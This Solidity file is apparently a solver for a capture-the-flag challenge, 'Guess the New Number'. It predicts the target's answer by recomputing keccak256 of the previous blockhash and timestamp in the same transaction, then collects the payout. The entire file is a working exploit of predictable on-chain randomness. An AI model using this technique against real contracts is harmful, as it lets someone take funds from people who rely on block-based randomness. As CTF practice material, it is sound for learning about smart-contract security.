// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

abstract contract GuessTheNewNumberChallengeInterface {
    function guess(uint8 n) public virtual payable;
}

contract GuessTheNewNumberChallengeSolver {
    function guess(GuessTheNewNumberChallengeInterface chal) external payable {
        require(msg.value == 1 ether);
        bytes32 _hash = keccak256(abi.encode(
            blockhash(block.number - 1),
            block.timestamp)
            );
        uint8 answer = uint8(uint256(_hash));
        chal.guess{value: msg.value}(answer);
    }

    function withdraw() external {
        uint balance = address(this).balance;
        (bool sent, ) = payable(msg.sender).call{value: balance}("");
        require(sent, "Failed to send ether");
    }

    receive() external payable {
    }
}